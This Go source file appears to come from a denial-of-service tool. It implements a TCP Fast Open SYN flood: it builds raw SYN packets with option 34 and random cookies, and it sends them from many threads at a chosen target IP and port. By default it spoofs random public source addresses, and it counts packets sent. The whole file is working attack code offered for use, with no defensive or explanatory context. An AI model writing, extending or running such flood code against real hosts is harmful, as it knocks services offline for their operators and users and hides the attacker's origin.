package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
	"context"
)

func buildTFO(srcIP, dstIP net.IP, dstPort uint16, localRand *rand.Rand) []byte {
	srcPort := uint16(localRand.Intn(60000) + 1024)
	
	// TCP header (20 bytes) + TFO option (TCP option 34, 2-18 bytes)
	// We'll use a 2-byte option (no cookie) or 10-byte (8-byte cookie)
	optLen := 10
	tcpLen := 20 + optLen
	tcp := make([]byte, tcpLen)
	
	binary.BigEndian.PutUint16(tcp[0:], srcPort)
	binary.BigEndian.PutUint16(tcp[2:], dstPort)
	binary.BigEndian.PutUint32(tcp[4:], localRand.Uint32())
	tcp[12] = uint8((tcpLen / 4) << 4) // header length
	tcp[13] = 0x02 // SYN flag
	binary.BigEndian.PutUint16(tcp[14:], 65535)
	
	// TFO Option (34)
	tcp[20] = 34     // Option Kind
	tcp[21] = uint8(optLen) // Length
	localRand.Read(tcp[22:]) // Random Cookie
	
	pseudo := make([]byte, 12+len(tcp))
	copy(pseudo[0:4], srcIP.To4())
	copy(pseudo[4:8], dstIP.To4())
	pseudo[9] = IPPROTO_TCP
	binary.BigEndian.PutUint16(pseudo[10:], uint16(len(tcp)))
	copy(pseudo[12:], tcp)
	binary.BigEndian.PutUint16(tcp[16:], checksum(pseudo))
	
	ip := buildIPHeaderLocal(srcIP, dstIP, IPPROTO_TCP, 20+len(tcp), localRand)
	return append(ip, tcp...)
}

func startTfoFlood(ctx context.Context, opts ContextOpts, targetIP string, targetPort int, threads int, duration time.Duration, pps int) {
	fmt.Printf("[!] Starting TFO Flood on %s:%d for %v with %d threads (PPS: %d)\n", targetIP, targetPort, duration, threads, pps)

	var wg sync.WaitGroup
	
	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		fmt.Printf("[ERR] Invalid target IP: %s\n", targetIP)
		return
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in TFO flood: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			// Socket per thread
			sockFd, err := openRawSocket(IPPROTO_TCP)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if pps > 0 {
						time.Sleep(time.Second / time.Duration(pps/threads+1))
					}

										var srcIP net.IP
					if opts.Config.NoSpoofing {
						srcIP = getLocalSrcIP(targetIP)
					} else if opts.Config.UseMixed && localRand.Intn(2) == 0 {
						srcIP = getLocalSrcIP(targetIP)
					} else {
						srcIP = randomPublicIPLocal(localRand)
					}
					packet := buildTFO(srcIP, dstIP, uint16(targetPort), localRand)

					if sockFd != InvalidSocket {
						sendtoRaw(sockFd, packet, dstIP, targetPort)
						AddStats(1, int64(len(packet)))
					}
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()
	fmt.Printf("[OK] TFO Flood finished\n")
}
